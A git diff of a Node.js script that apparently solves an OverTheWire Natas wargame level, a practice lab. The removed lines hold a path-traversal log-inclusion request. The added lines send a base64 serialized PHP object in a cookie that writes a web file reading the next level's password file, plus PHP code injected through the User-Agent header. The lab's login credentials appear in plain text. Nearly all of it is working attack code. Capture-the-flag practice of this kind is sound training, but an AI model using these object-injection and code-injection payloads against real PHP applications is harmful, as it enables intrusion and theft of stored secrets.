@@ -2,19 +2,11 @@
 /* eslint-disable */
 http = require('http');
 
-abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP';
 credentials = {
     host: 'natas26.natas.labs.overthewire.org',
     login: 'natas26',
     password: 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
 }
-
-let t = 0;
-// let i = 640
-
-// while (--i)
-//     doReq(i)
 
 function toHex(str) {
     str = '' + str
@@ -25,20 +17,20 @@ function toHex(str) {
     return result;
 }
 
-function doReq(n, l) {
+function doReq(n) {
     const id = n
-    console.log('start ', n);
-    const postData = 'lang=../.../...//../logs/natas25_aab.log';
+    console.log('start ', id);
+    const postData = '';
 
     const options = {
         host: credentials.host,
-        path: '/index.php?debug=true',
+        path: '/index.php?debug=true&y1=2&y2=2&x1=99&x2=99',
         method: 'POST',
         auth: `${credentials.login}:${credentials.password}`,
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': Buffer.byteLength(postData),
-            'COOKIE': '__CTFDUID=d35235c9d96005d843dda5be85d3bb82e1541240386;PHPSESSID=aab;',
+            'COOKIE': 'PHPSESSID=aaa;drawing=Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2Fuc3dlci5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjYiKSA/PiI7fQ==',
             'USER-AGENT': '<?php echo file_get_contents("/etc/natas_webpass/natas26") ?>'
 
         }
@@ -55,7 +47,7 @@ function doReq(n, l) {
         });
         res.on('end', () => {
             console.log(total);
-            console.log('end', ++t, id)
+            console.log('end', id)
             process.exit()
         });
     });
@@ -69,4 +61,4 @@ function doReq(n, l) {
     req.end();
 }
 
-doReq(1,true);
+doReq(1);
